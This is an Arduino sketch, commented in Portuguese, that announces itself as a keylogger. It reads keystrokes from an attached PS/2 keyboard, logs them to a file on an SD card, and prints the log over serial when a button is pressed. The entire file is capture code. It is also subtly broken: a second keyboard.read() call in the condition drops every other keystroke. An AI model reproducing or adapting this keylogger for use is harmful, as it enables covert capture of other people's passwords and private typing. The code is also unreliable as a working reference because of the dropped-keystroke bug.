#include <stdlib.h>
#include <PS2Keyboard.h>
PS2Keyboard keyboard;
#include <SPI.h>
#include <SD.h>
File meuArquivo;

const int Btn = 6;
const int Led = 7;
const int DataPin = 2;
const int IRQpin =  3;
char c = 'a';

const int CS = 4;
char dataString[7];

 void imprime(){
 meuArquivo = SD.open("TEST.txt");
  if (meuArquivo) {
    Serial.println("TEST.txt:");

    while (meuArquivo.available()) {
      Serial.write(meuArquivo.read());
    }
    meuArquivo.close();
  } else {
    Serial.println("error opening test.txt");
  }
 }

void setup() {
  Serial.begin(9600);
  pinMode(CS, OUTPUT);
  pinMode(Led, OUTPUT);
  pinMode(Btn, INPUT);
  keyboard.begin(DataPin, IRQpin);
  Serial.println("Keylogger iniciado!");
  Serial.println("Inicializando cartao SD...");
  if (!SD.begin(CS)) 
  {
    Serial.println("Falha na Inicializacao! Verifique o cartao sd");
    return;
  }
  Serial.println("Inicializacao terminada");
  delay(1000);
}

void loop() {

  if(digitalRead(Btn)==LOW){
    imprime();
    }
  if (keyboard.available()) {

    digitalWrite(Led, HIGH);

    c = keyboard.read();

    if(keyboard.read()){
    if (c == PS2_ENTER) {
      Serial.println();
      meuArquivo = SD.open("TEST.txt", FILE_WRITE);
      meuArquivo.println(c);
      meuArquivo.close();
    } else if (c == PS2_TAB) {
      Serial.print("[Tab]");
    } else if (c == PS2_ESC) {
      Serial.print("[ESC]");
    } else if (c == PS2_PAGEDOWN) {
      Serial.print("[PgDn]");
    } else if (c == PS2_PAGEUP) {
      Serial.print("[PgUp]");
    } else if (c == PS2_LEFTARROW) {
      Serial.print("[Left]");
    } else if (c == PS2_RIGHTARROW) {
      Serial.print("[Right]");
    } else if (c == PS2_UPARROW) {
      Serial.print("[Up]");
    } else if (c == PS2_DOWNARROW) {
      Serial.print("[Down]");
    } else if (c == PS2_DELETE) {
      Serial.print("[Del]");
    } else {

      Serial.print(c);
  }
   meuArquivo = SD.open("TEST.txt", FILE_WRITE);
   meuArquivo.print(c);
   meuArquivo.close();
  }
  digitalWrite(Led, LOW);
  }
}